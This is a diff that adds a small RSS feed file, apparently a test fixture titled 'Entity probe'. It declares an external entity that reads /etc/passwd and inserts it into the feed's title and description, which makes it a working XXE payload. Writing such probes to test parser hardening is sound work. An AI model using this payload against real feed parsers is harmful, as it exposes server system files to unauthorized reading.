@@ -1,0 +1,14 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [
+  <!ENTITY leak SYSTEM "file:///etc/passwd">
+]>
+<rss version="2.0">
+  <channel>
+    <title>&leak;</title>
+    <item>
+      <title>Entity probe</title>
+      <link>https://feeds.example.org/xxe</link>
+      <description>&leak;</description>
+    </item>
+  </channel>
+</rss>
